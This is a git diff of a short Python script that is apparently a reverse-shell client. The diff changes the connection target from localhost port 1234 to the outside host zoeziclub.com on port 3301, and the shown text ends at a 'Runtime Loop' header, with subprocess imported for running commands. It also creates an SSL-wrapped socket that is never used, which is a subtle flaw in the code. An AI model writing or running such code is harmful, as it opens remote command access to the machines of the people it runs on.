@@ -1,16 +1,18 @@
-# Imports
-from ctypes.wintypes import INT
 import socket
+import ssl
 import subprocess
 
-# Setting Up IP/Sockets
-REMOTE_HOST = '127.0.0.1' 
-REMOTE_PORT = 1234 # 2222
-client = socket.socket()
+initial_url = "https://zoeziclub.com"
+url_parts = initial_url.split("//")[1].split("/", 1)
+hostname = url_parts[0]
+path = url_parts[1] if len(url_parts) > 1 else "/"
 
-# Initializing Connection
-print("[-] Connection Initiating...")
-client.connect((REMOTE_HOST, REMOTE_PORT))
+context = ssl.create_default_context()
+sock = context.wrap_socket(socket.socket(socket.AF_INET), server_hostname=hostname)
+server_address = (hostname, 3301)
+client = socket.socket()
+client.connect(server_address)
+
 print("[-] Connection initiated!")
 
 # Runtime Loop
